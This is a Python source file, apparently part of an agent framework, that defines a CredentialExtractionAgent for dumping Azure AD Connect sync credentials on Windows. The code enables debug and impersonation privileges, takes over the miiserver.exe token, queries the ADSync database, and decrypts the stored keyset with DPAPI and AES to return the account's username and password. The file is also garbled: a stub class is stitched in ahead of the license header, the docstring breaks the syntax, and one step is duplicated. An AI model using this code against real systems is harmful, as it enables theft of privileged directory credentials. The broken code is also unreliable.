#!/usr/bin/env python3
from __future__ import annotations
# Minimal CredentialExtractionAgent stub for repair runs.

class CredentialExtractionAgent:
    """Repair-time stub used to restore imports."""

    def extract(self, source: str) -> dict:
        return {}


__all__ = ["CredentialExtractionAgent"]
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License")
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


"""
Module: credential_extraction_agent
Agent for extracting credentials from Windows systems.
Implements patterns from ADSyncDump-BOF for Azure AD Connect credential extraction.
"""
import platform
from typing import Any, Dict
from uuid import UUID

from src.core.base.lifecycle.base_agent import BaseAgent
from src.core.base.mixins.crypto_mixin import CryptoMixin
from src.core.base.mixins.database_access_mixin import DatabaseAccessMixin
from src.core.base.mixins.data_parsing_mixin import DataParsingMixin
from src.core.base.mixins.privilege_escalation_mixin import PrivilegeEscalationMixin



class CredentialExtractionAgent(
    BaseAgent,
    PrivilegeEscalationMixin,
    DatabaseAccessMixin,
    CryptoMixin,
    DataParsingMixin
):
    """Agent for extracting credentials using Windows-specific techniques."""

    def __init__(self, **kwargs: Any) -> None:
        if platform.system() != "Windows":
            raise RuntimeError("CredentialExtractionAgent is only supported on Windows")
        super().__init__(**kwargs)
        PrivilegeEscalationMixin.__init__(self, **kwargs)
        DatabaseAccessMixin.__init__(self, **kwargs)
        CryptoMixin.__init__(self, **kwargs)
        DataParsingMixin.__init__(self, **kwargs)


    async def extract_adsync_credentials(self) -> Dict[str, Any]:
"""
Extract Azure AD Connect sync credentials.""
result = {
            "success": False,
            "username": None,
            "password": None,
            "error": None
        }

        try:
            # Enable required privileges
            process_id = self.find_process_by_name("miiserver.exe")
            if not process_id:
                result["error"] = "ADSync process (miiserver.exe) not found"
                return result
            if not self.enable_privilege("SeDebugPrivilege"):
                result["error"] = "Failed to enable SeDebugPrivilege"
                return result

            if not self.enable_privilege("SeImpersonatePrivilege"):
                result["error"] = "Failed to enable SeImpersonatePrivilege"
                return result

            # Find ADSync process
            process_id = self.find_process_by_name("miiserver.exe")
            if not process_id:
                result["error"] = "ADSync process (miiserver.exe) not found"
                return result

            # Impersonate ADSync process token
            if not self.impersonate_process_token(process_id):
                result["error"] = "Failed to impersonate ADSync process token"
                return result

            try:
                # Connect to ADSync database
                conn_str = (
                    r"Driver={ODBC Driver 17 for SQL Server};"
                    r"Server=(LocalDB)\\.\\ADSync2019;Database=ADSync;Trusted_Connection=yes"
                )
                if not self.connect_odbc(conn_str):
                    result["error"] = f"Failed to connect to ADSync database: {self.get_last_error()}"
                    return result

                # Query key metadata
                metadata_query = "SELECT instance_id, keyset_id, entropy FROM mms_server_configuration;"
                metadata = self.execute_query(metadata_query)
                if not metadata or len(metadata) == 0:
                    result["error"] = "No key metadata found"
                    return result

                # Extract metadata
                instance_id = UUID(bytes=metadata[0]["instance_id"])
                # keyset_id = metadata[0]["keyset_id"]
                entropy_id = UUID(bytes=metadata[0]["entropy"])
                # Query key material
                material_query = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;"
                material = self.execute_query(material_query)
                if not material or len(material) == 0:
                    result["error"] = "No key material found"
                    return result

                # _private_config = material[0]["private_configuration_xml"]
                encrypted_config = material[0]["encrypted_configuration"]
                # Read keyset from Windows Credentials
                key_name = f"Microsoft_AzureADConnect_KeySet_{instance_id}_100000"
                keyset_blob = self.read_windows_credential(key_name)
                if not keyset_blob:
                    result["error"] = f"Failed to read keyset: {key_name}"
                    return result

                # Decrypt keyset using DPAPI
                entropy = entropy_id.bytes
                decrypted_keyset = self.decrypt_dpapi_blob(keyset_blob, entropy)
                if not decrypted_keyset:
                    result["error"] = "Failed to decrypt keyset"
                    return result

                # Extract AES key and IV from decrypted keyset
                aes_key = decrypted_keyset[-44:-20]  # Key offset logic
                aes_iv = self.base64_decode(encrypted_config)[:16]  # IV from base64 decoded config

                # Decrypt configuration
                encrypted_data = self.base64_decode(encrypted_config)[16:]  # Skip IV
                if not encrypted_data:
                    result["error"] = "Failed to decode encrypted configuration"
                    return result

                decrypted_config = self.decrypt_aes_cbc(aes_key, aes_iv, encrypted_data)
                if not decrypted_config:
                    result["error"] = "Failed to decrypt configuration"
                    return result

                # Parse credentials from decrypted config
                username = self.extract_xml_value(decrypted_config.decode('utf-16le'), "parameter name=\"UserName\"")
                password = self.extract_xml_value(decrypted_config.decode('utf-16le'), "parameter name=\"Password\"")
                result["success"] = True
                result["username"] = username
                result["password"] = password
            finally:
                self.disconnect()
                self.revert_to_self()
                self.cleanup_tokens()

        except Exception as e:
            result["error"] = str(e)
        return result
